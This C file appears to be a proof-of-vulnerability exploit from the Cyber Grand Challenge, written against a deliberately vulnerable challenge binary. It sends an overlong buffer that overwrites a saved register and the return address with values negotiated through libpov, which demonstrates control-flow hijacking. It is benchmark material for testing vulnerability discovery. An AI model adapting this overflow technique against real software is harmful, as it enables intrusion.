/*

Author: Debbie Nuttall <debbie@cromulence.com>

Copyright (c) 2016 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/

#include <libpov.h>
#include <libcgc.h>

#define TO_CB   1
#define FROM_CB 0
#define TO_SF   3
#define FROM_SF 3


int SendToCB(char *buf, int length) {
  int total_sent = 0;
  int ret;
  size_t bytes_sent = 0;
  while(total_sent < length) {
    ret = transmit(TO_CB, buf + total_sent, length - total_sent, &bytes_sent);
    if (ret != 0) {
      // error
      return -1;
    }
    if (bytes_sent == 0) {
      break;
    }
    total_sent += bytes_sent;
  }
  return bytes_sent;
}

int ReceiveFromCB(char *buf, int length) {
  size_t total_received = 0;
  size_t bytes_received = 0;
  int ret;
  while (total_received < length) {
    ret = receive(FROM_CB, buf + total_received , length - total_received , &bytes_received);
    if (ret != 0) {
      return -1;
    }
    if (bytes_received == 0) {
      break;
    }
    total_received += bytes_received;
  }
  return total_received;
}

int main(void) {
  // negotiate
  type1_vals t1vals;
  type1_negotiate(0xEEEEEEEE, 0xEEEEEEEE, 5, &t1vals);

  // perform POV
  char bytes[86] = "3XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXRRRRIIII\n";
  bytes[0] = 3;
  *(int *)(bytes + 77) = t1vals.regval | 0x11111111;
  *(int *)(bytes + 81) = t1vals.ipval | 0x11111111;
  SendToCB(bytes, sizeof(bytes));
  SendToCB((char *)&"X\n", 2);
  char ret[24];
  ReceiveFromCB(ret, 24);
  return 0;
}